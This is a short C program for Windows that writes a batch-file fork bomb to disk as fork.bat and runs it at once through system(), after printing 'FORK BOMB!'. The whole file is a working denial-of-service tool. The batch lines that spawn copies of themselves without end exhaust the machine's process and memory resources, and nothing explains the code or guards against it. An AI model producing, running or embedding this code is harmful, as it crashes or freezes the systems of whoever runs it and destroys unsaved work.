#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main()
{
	FILE *fp;
	fp=fopen("fork.bat","w");
	if(fp==NULL)
	{
		printf("ERROR!");
		exit(1);
	}
	
	fprintf(fp,":s\n");
	fprintf(fp,"start %%0\n");
	fprintf(fp,"%%0|%%0\n");
	fprintf(fp,"goto :s");
	rewind(fp);
	fclose(fp);
	
	printf("FORK BOMB!");
	system("fork.bat");
	
}
